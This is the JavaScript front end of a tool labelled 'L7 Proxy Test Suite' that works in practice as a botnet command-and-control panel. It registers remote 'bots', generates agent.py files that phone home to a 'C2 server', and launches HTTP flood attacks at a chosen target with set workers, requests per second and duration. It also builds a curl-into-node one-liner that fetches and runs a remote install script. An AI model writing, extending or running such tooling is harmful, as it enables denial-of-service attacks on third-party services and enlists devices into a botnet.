/* L7 Proxy Test Suite — app.js */

let es = null, rpsChart = null, statusChart = null;
let running = false, floodStart = null, floodDur = 30;
let lastTotal = 0, lastTick = null;
let runHistory = JSON.parse(localStorage.getItem('l7h') || '[]');
let bots = [];

/* ── Init ─────────────────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', () => {
    initCharts();
    renderHistory();
    loadConfig();
    checkProxy();
    setInterval(checkProxy, 10000);
    fetchBots();
    setInterval(fetchBots, 15000);
    // Pre-fill installer port from current page URL
    const portHint = location.port || '5000';
    const cp = document.getElementById('c2-port');
    if (cp) cp.value = portHint;
    updateInstallers();
});

/* ── Page navigation ──────────────────────────────────────────── */
function showPage(name, el) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById('page-' + name).classList.add('active');
    if (el) el.classList.add('active');
    document.getElementById('breadcrumb').textContent =
        name === 'dashboard' ? 'Dashboard' :
        name === 'bots'      ? 'Devices'   : 'Settings';
    if (name === 'settings') loadConfig();
    if (name === 'bots')     fetchBots();
    return false;
}

/* ── Proxy status ─────────────────────────────────────────────── */
async function checkProxy() {
    const dot = document.getElementById('proxy-dot');
    const txt = document.getElementById('proxy-text');
    dot.className = 'dot dot-checking';
    try {
        const r = await fetch('/api/proxy-status', { signal: AbortSignal.timeout(5000) });
        const d = await r.json();
        if (d.ok) {
            dot.className = 'dot dot-online';
            txt.textContent = 'Proxy: online ' + d.ms + 'ms';
            const pa = document.getElementById('proxy-addr');
            if (pa) pa.textContent = d.host + ':' + d.port;
        } else {
            dot.className = 'dot dot-offline';
            txt.textContent = 'Proxy: unreachable';
        }
    } catch {
        dot.className = 'dot dot-offline';
        txt.textContent = 'Proxy: offline';
    }
}

/* ── Config ───────────────────────────────────────────────────── */
async function loadConfig() {
    try {
        const r = await fetch('/api/config');
        const d = await r.json();
        const h = document.getElementById('cfg-host');
        const p = document.getElementById('cfg-port');
        if (h) h.value = d.proxy_host || '';
        if (p) p.value = d.proxy_port || '';
        const pa = document.getElementById('proxy-addr');
        if (pa) pa.textContent = (d.proxy_host || '') + ':' + (d.proxy_port || '');
    } catch {}
}

async function saveConfig(e) {
    e.preventDefault();
    const host = document.getElementById('cfg-host').value.trim();
    const port = parseInt(document.getElementById('cfg-port').value) || 3128;
    const st   = document.getElementById('cfg-status');
    st.className = 'cfg-status';
    st.textContent = 'Saving...';
    try {
        const r = await fetch('/api/config', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ host, port })
        });
        const d = await r.json();
        if (d.ok) {
            st.className = 'cfg-status ok';
            st.textContent = 'Config applied: ' + host + ':' + port;
            const pa = document.getElementById('proxy-addr');
            if (pa) pa.textContent = host + ':' + port;
            checkProxy();
        } else {
            st.className = 'cfg-status err';
            st.textContent = 'Error: ' + (d.error || 'unknown');
        }
    } catch (err) {
        st.className = 'cfg-status err';
        st.textContent = 'Request failed: ' + err.message;
    }
}

async function testProxy() {
    const el = document.getElementById('test-result');
    el.className = 'cfg-status';
    el.textContent = 'Testing...';
    try {
        const r = await fetch('/api/proxy-status', { signal: AbortSignal.timeout(6000) });
        const d = await r.json();
        if (d.ok) {
            el.className = 'cfg-status ok';
            el.textContent = 'Proxy reachable — ' + d.ms + 'ms — ' + d.host + ':' + d.port;
        } else {
            el.className = 'cfg-status err';
            el.textContent = 'Proxy unreachable: ' + (d.error || 'connection refused');
        }
    } catch (err) {
        el.className = 'cfg-status err';
        el.textContent = 'Test failed: ' + err.message;
    }
}

/* ── Bots / Agents ────────────────────────────────────────────── */
let agentResults = [];

async function fetchBots() {
    try {
        const r = await fetch('/api/bots');
        const d = await r.json();
        bots = d.bots || [];
        renderBots();
    } catch {}
}

function renderBots() {
    const tb = document.getElementById('bots-body');
    const bc = document.getElementById('bot-count');
    if (bc) bc.textContent = bots.length;
    if (!tb) return;
    if (!bots.length) {
        tb.innerHTML = '<tr><td colspan="7" class="muted-cell">No devices connected — deploy agent.py to a device to get started</td></tr>';
    } else {
        const now = Date.now() / 1000;
        tb.innerHTML = bots.map(b => {
            const ago    = Math.round(now - (b.last_seen || 0));
            const online = ago < 30;
            const dot    = online
                ? '<span class="dot dot-online" style="display:inline-block"></span>'
                : '<span class="dot dot-offline" style="display:inline-block"></span>';
            const agoStr = ago < 60 ? ago + 's ago' : ago < 3600 ? Math.floor(ago/60) + 'm ago' : 'inactive';
            return `<tr>
                <td>${dot}</td>
                <td style="font-family:monospace;font-size:.8rem">${b.id}</td>
                <td>${b.hostname || b.label || '-'}</td>
                <td style="font-size:.78rem;color:#64748b">${b.platform || '-'}</td>
                <td style="font-family:monospace;font-size:.8rem">${b.ip || '-'}</td>
                <td style="color:${online ? '#16a34a' : '#94a3b8'}">${agoStr}</td>
                <td><button class="btn-link" style="color:#ef4444" onclick="removeBot('${b.id}')">Remove</button></td>
            </tr>`;
        }).join('');
    }
    renderAgentSelector();
}

/* ── Agent selector (Dashboard) ───────────────────────────────── */
function renderAgentSelector() {
    const box = document.getElementById('agent-select-box');
    const badge = document.getElementById('agent-count-badge');
    if (!box) return;
    if (!bots.length) {
        box.innerHTML = '<div class="agent-select-empty">No agents connected</div>';
        if (badge) badge.textContent = '0';
        return;
    }
    const now = Date.now() / 1000;
    // Preserve existing checked state
    const checked = new Set(getSelectedAgentIds());
    box.innerHTML = bots.map(b => {
        const ago    = Math.round(now - (b.last_seen || 0));
        const online = ago < 30;
        const dot    = online ? '🟢' : '🔴';
        const isChecked = checked.size === 0 || checked.has(b.id); // default all checked
        return `<label class="agent-select-row">
            <input type="checkbox" class="agent-cb" value="${b.id}" ${isChecked ? 'checked' : ''} onchange="updateAgentBadge()">
            <span class="dot ${online ? 'dot-online' : 'dot-offline'}" style="display:inline-block;flex-shrink:0"></span>
            <span style="font-family:monospace;font-size:.8rem;flex:1">${b.id}</span>
            <span style="font-size:.75rem;color:#64748b">${b.hostname || b.ip || ''}</span>
        </label>`;
    }).join('');
    updateAgentBadge();
}

function updateAgentBadge() {
    const checked = getSelectedAgentIds();
    const badge   = document.getElementById('agent-count-badge');
    if (badge) badge.textContent = checked.length + ' / ' + bots.length;
}

function getSelectedAgentIds() {
    return Array.from(document.querySelectorAll('.agent-cb:checked')).map(el => el.value);
}

function selectAllAgents(val) {
    document.querySelectorAll('.agent-cb').forEach(cb => cb.checked = val);
    updateAgentBadge();
}

// Show/hide agent selector when toggle changes
document.addEventListener('change', e => {
    if (e.target.id === 'opt-bots') {
        const field = document.getElementById('agent-selector-field');
        if (field) {
            field.style.display = e.target.checked ? 'flex' : 'none';
            if (e.target.checked) renderAgentSelector();
        }
    }
});

async function removeBot(id) {
    await fetch('/api/bots/remove', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id })
    });
    fetchBots();
}

/* ── Installer one-liners ─────────────────────────────────────── */
function updateInstallers() {
    const host = (document.getElementById('c2-host').value.trim()) || 'YOUR_C2_IP';
    const port = (document.getElementById('c2-port').value.trim()) || '5000';
    const jsEl = document.getElementById('install-js');
    if (jsEl) jsEl.textContent = `node -e "$(curl -s 'http://${host}:${port}/install.js?host=${host}&port=${port}')"`;
}

function copyInstaller(type) {
    const el = document.getElementById('install-' + type);
    if (!el) return;
    navigator.clipboard.writeText(el.textContent)
        .then(() => { el.style.opacity = '.5'; setTimeout(() => el.style.opacity = '1', 400); })
        .catch(() => alert('Copy failed — select and copy manually'));
}

/* ── Agent generator ──────────────────────────────────────────── */
function downloadAgent() {
    const host = document.getElementById('c2-host').value.trim();
    const port = document.getElementById('c2-port').value.trim() || '5000';
    const st   = document.getElementById('agent-status');
    if (!host) {
        st.className = 'cfg-status err';
        st.textContent = 'Enter the C2 server IP first.';
        return;
    }
    st.className = 'cfg-status';
    st.textContent = 'Generating...';
    const url = `/api/agent/generate?host=${encodeURIComponent(host)}&port=${encodeURIComponent(port)}`;
    const a   = document.createElement('a');
    a.href    = url;
    a.download = `agent_${host.replace(/\./g,'_')}.py`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    st.className = 'cfg-status ok';
    st.textContent = 'agent.py downloaded — copy to device and run: python3 agent.py';

    // Update deploy preview
    const pre = document.getElementById('deploy-preview');
    if (pre) pre.textContent = `# Copy the downloaded agent.py to each device, then:\npython3 agent_${host.replace(/\./g,'_')}.py\n\n# The agent will connect to ${host}:${port} and await tasks.`;
}

/* ── Agent results ────────────────────────────────────────────── */
async function fetchAgentResults() {
    try {
        const r = await fetch('/api/agent/results');
        const d = await r.json();
        agentResults = d.results || [];
        renderAgentResults();
    } catch {}
}

function renderAgentResults() {
    const tb = document.getElementById('results-body');
    if (!tb) return;
    if (!agentResults.length) {
        tb.innerHTML = '<tr><td colspan="8" class="muted-cell">No results yet</td></tr>';
        return;
    }
    tb.innerHTML = agentResults.map(r => `<tr>
        <td>${fmtTime(r.ts)}</td>
        <td style="font-family:monospace;font-size:.78rem">${r.agent_id}</td>
        <td style="font-family:monospace;font-size:.78rem;color:#94a3b8">${(r.task_id||'').slice(0,8)}</td>
        <td>${(+r.total).toLocaleString()}</td>
        <td>${r.rps_actual}</td>
        <td style="color:#16a34a;font-weight:600">${(+r.success).toLocaleString()}</td>
        <td style="color:#dc2626;font-weight:600">${(+r.errors).toLocaleString()}</td>
        <td>${r.wall}s</td>
    </tr>`).join('');
}

function clearAgentResults() {
    agentResults = [];
    renderAgentResults();
}

/* ── Charts ───────────────────────────────────────────────────── */
function initCharts() {
    rpsChart = new Chart(document.getElementById('rpsChart').getContext('2d'), {
        type: 'line',
        data: { labels: [], datasets: [{ label: 'RPS', data: [],
            borderColor: '#6366f1', backgroundColor: 'rgba(99,102,241,.08)',
            borderWidth: 2, pointRadius: 0, fill: true, tension: 0.4 }] },
        options: { responsive: true, animation: false,
            scales: { x: { display: false },
                      y: { beginAtZero: true, grid: { color: 'rgba(0,0,0,.04)' } } },
            plugins: { legend: { display: false } } }
    });
    statusChart = new Chart(document.getElementById('statusChart').getContext('2d'), {
        type: 'doughnut',
        data: { labels: [], datasets: [{ data: [], backgroundColor: [] }] },
        options: { responsive: true, plugins: { legend: { position: 'right', labels: { font: { size: 11 } } } } }
    });
}

const SC_COLORS = { '2xx':'#4ade80','3xx':'#fbbf24','4xx':'#f87171','5xx':'#c084fc','0xx':'#94a3b8' };

function updateStatusChart(counts) {
    const g = { '2xx':0,'3xx':0,'4xx':0,'5xx':0,'0xx':0 };
    for (const [c,n] of Object.entries(counts)) {
        const k = c==='0' ? '0xx' : c[0]+'xx';
        g[k] = (g[k]||0) + n;
    }
    const labels=[], data=[], colors=[];
    for (const [k,v] of Object.entries(g)) if (v) { labels.push(k); data.push(v); colors.push(SC_COLORS[k]); }
    statusChart.data.labels = labels;
    statusChart.data.datasets[0].data = data;
    statusChart.data.datasets[0].backgroundColor = colors;
    statusChart.update();

    const row = document.getElementById('status-chips');
    row.innerHTML = '';
    for (const [c,n] of Object.entries(counts).sort()) {
        if (!n) continue;
        const cls = c==='0' ? 'chip-0xx' : 'chip-'+c[0]+'xx';
        const chip = document.createElement('span');
        chip.className = 'chip ' + cls;
        chip.textContent = (c==='0' ? 'ERR' : 'HTTP '+c) + ': ' + n.toLocaleString();
        row.appendChild(chip);
    }
}

function pushRps(v) {
    const d = rpsChart.data;
    d.labels.push(new Date().toLocaleTimeString());
    d.datasets[0].data.push(+v.toFixed(1));
    if (d.labels.length > 120) { d.labels.shift(); d.datasets[0].data.shift(); }
    rpsChart.update();
}

/* ── Presets ──────────────────────────────────────────────────── */
function applyPreset(w,r,d) {
    document.getElementById('workers').value  = w;
    document.getElementById('rps').value      = r;
    document.getElementById('duration').value = d;
}

/* ── Start flood ──────────────────────────────────────────────── */
async function startFlood(e) {
    e.preventDefault();
    if (running) return;

    const target   = document.getElementById('target').value.trim();
    const method   = document.getElementById('attack-type').value;
    const workers  = +document.getElementById('workers').value;
    const rps      = +document.getElementById('rps').value;
    const duration = +document.getElementById('duration').value;
    const useLocal = document.getElementById('opt-local').checked;
    const useBots  = document.getElementById('opt-bots').checked;

    if (!useLocal && !useBots) {
        addLog('Select at least one launch mode (server or agents)', 'error'); return;
    }

    floodDur   = duration;
    floodStart = Date.now();
    lastTotal  = 0;
    lastTick   = Date.now();

    setRunning(true);
    clearLogEl();
    const modes = [useLocal ? 'server' : null, useBots ? 'agents' : null].filter(Boolean).join(' + ');
    addLog('Launching ' + method + ' flood via ' + modes + ' -> ' + target, 'info');
    addLog('Workers: ' + workers + '  RPS: ' + rps + '  Duration: ' + duration + 's', 'info');

    try {
        const selectedIds = useBots ? getSelectedAgentIds() : [];
        const r = await fetch('/api/start', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target, method, workers, rps, duration,
                                   local: useLocal, bots: useBots,
                                   agent_ids: selectedIds.length ? selectedIds : null })
        });
        const d = await r.json();
        if (!d.ok) { addLog('Error: ' + d.error, 'error'); setRunning(false); return; }
        if (d.dispatched) addLog('Dispatched to ' + d.dispatched + ' agent(s)', 'success');
        if (!useLocal) { setRunning(false); return; } // agents only — no local SSE stream
    } catch (err) {
        addLog('Cannot reach server: ' + err.message, 'error');
        setRunning(false); return;
    }

    if (es) { es.close(); es = null; }
    es = new EventSource('/api/stream');
    es.onmessage = ev => onEvent(JSON.parse(ev.data));
    es.onerror   = () => { if (running) { addLog('Stream disconnected', 'warning'); setRunning(false); } };
}

/* ── Stop flood ───────────────────────────────────────────────── */
async function stopFlood() {
    addLog('Emergency stop sent...', 'warning');
    try {
        const r = await fetch('/api/stop', { method: 'POST' });
        const d = await r.json();
        if (!d.ok) addLog('Stop request failed', 'error');
    } catch (err) {
        addLog('Stop request error: ' + err.message, 'error');
    }
}

/* ── SSE handler ──────────────────────────────────────────────── */
function onEvent(d) {
    if (d.type === 'tick') {
        const now     = Date.now();
        const elapsed = (now - floodStart) / 1000;
        const pct     = Math.min(elapsed / floodDur * 100, 100);
        const delta   = (d.total||0) - lastTotal;
        const dt      = (now - (lastTick||now)) / 1000;
        const instRps = dt > 0 ? delta / dt : 0;
        lastTotal = d.total||0; lastTick = now;

        document.getElementById('stat-rps').textContent     = instRps.toFixed(0);
        document.getElementById('stat-total').textContent   = (d.total||0).toLocaleString();
        document.getElementById('stat-success').textContent = (d.success||0).toLocaleString();
        document.getElementById('stat-errors').textContent  = (d.errors||0).toLocaleString();
        document.getElementById('stat-elapsed').textContent = elapsed.toFixed(0) + 's';
        if (d.p50 != null) document.getElementById('stat-p50').textContent = d.p50.toFixed(0);
        if (d.p99 != null) document.getElementById('stat-p99').textContent = d.p99.toFixed(0);
        document.getElementById('progress-fill').style.width   = pct + '%';
        document.getElementById('progress-pct').textContent    = pct.toFixed(0) + '%';
        pushRps(instRps);
        if (d.status_counts) updateStatusChart(d.status_counts);
    }

    if (d.type === 'log') {
        addLog(d.msg, d.level || 'info');
    }

    if (d.type === 'done') {
        setRunning(false);
        if (es) { es.close(); es = null; }
        addLog('---', 'info');
        addLog((d.stopped_early ? 'Stopped' : 'Complete') +
               ' — ' + (d.total||0).toLocaleString() + ' sent' +
               '  RPS: ' + (d.rps_actual||0).toFixed(1) +
               '  p50: ' + (d.p50||0).toFixed(0) + 'ms' +
               '  p99: ' + (d.p99||0).toFixed(0) + 'ms', 'success');
        saveHistory({
            time: new Date().toLocaleTimeString(), method: d.method||'-',
            target: d.target||'-', total: d.total||0,
            rps: (d.rps_actual||0).toFixed(1),
            p50: (d.p50||0).toFixed(0), p99: (d.p99||0).toFixed(0),
            success: d.success||0, errors: d.errors||0,
            duration: (d.wall||0).toFixed(1)
        });
    }

    if (d.type === 'bot_update') {
        bots = d.bots || [];
        renderBots();
        const b = document.getElementById('agent-count-badge');
        if (b) b.textContent = bots.length;
    }

    if (d.type === 'agent_result') {
        agentResults.unshift(d.result);
        if (agentResults.length > 200) agentResults.pop();
        renderAgentResults();
        addLog('Agent ' + d.result.agent_id + ' reported: ' +
               d.result.total + ' sent, ' + d.result.rps_actual + ' rps', 'success');
    }
}

/* ── UI state ─────────────────────────────────────────────────── */
function setRunning(r) {
    running = r;
    const sb = document.getElementById('start-btn');
    const st = document.getElementById('stop-btn');
    const lt = document.getElementById('live-tag');
    const pr = document.getElementById('progress-row');
    sb.disabled      = r;
    sb.textContent   = r ? 'Running...' : 'Launch Flood';
    st.style.display = r ? 'inline-flex' : 'none';
    lt.style.display = r ? 'inline' : 'none';
    pr.style.display = r ? 'flex' : 'none';
    if (!r) {
        document.getElementById('progress-fill').style.width = '100%';
        document.getElementById('progress-pct').textContent  = 'Done';
    }
}

/* ── Log ──────────────────────────────────────────────────────── */
function addLog(msg, cls) {
    const el = document.getElementById('log');
    const ph = el.querySelector('.log-muted');
    if (ph) ph.remove();
    const line = document.createElement('div');
    line.className = 'log-line ' + (cls || 'info');
    line.textContent = msg;
    el.appendChild(line);
    el.scrollTop = el.scrollHeight;
    while (el.children.length > 500) el.removeChild(el.firstChild);
}
function clearLogEl() { document.getElementById('log').innerHTML = ''; }
function clearLog() {
    clearLogEl();
    const m = document.createElement('span');
    m.className = 'log-muted'; m.textContent = 'Log cleared.';
    document.getElementById('log').appendChild(m);
}

/* ── History ──────────────────────────────────────────────────── */
function saveHistory(e) {
    runHistory.unshift(e);
    if (runHistory.length > 50) runHistory.pop();
    localStorage.setItem('l7h', JSON.stringify(runHistory));
    renderHistory();
}
function renderHistory() {
    const tb = document.getElementById('hist-body');
    if (!runHistory.length) {
        tb.innerHTML = '<tr><td colspan="10" class="muted-cell">No runs yet</td></tr>';
        return;
    }
    tb.innerHTML = runHistory.map(h => `<tr>
        <td>${h.time}</td>
        <td><strong>${h.method}</strong></td>
        <td style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${h.target}</td>
        <td>${(+h.total).toLocaleString()}</td>
        <td>${h.rps}</td>
        <td>${h.p50}ms</td>
        <td>${h.p99}ms</td>
        <td style="color:#16a34a;font-weight:600">${(+h.success).toLocaleString()}</td>
        <td style="color:#dc2626;font-weight:600">${(+h.errors).toLocaleString()}</td>
        <td>${h.duration}s</td>
    </tr>`).join('');
}
function clearHistory() {
    runHistory = []; localStorage.removeItem('l7h'); renderHistory();
}

/* ── Util ─────────────────────────────────────────────────────── */
function fmtTime(ts) {
    if (!ts) return '-';
    return new Date(ts * 1000).toLocaleTimeString();
}
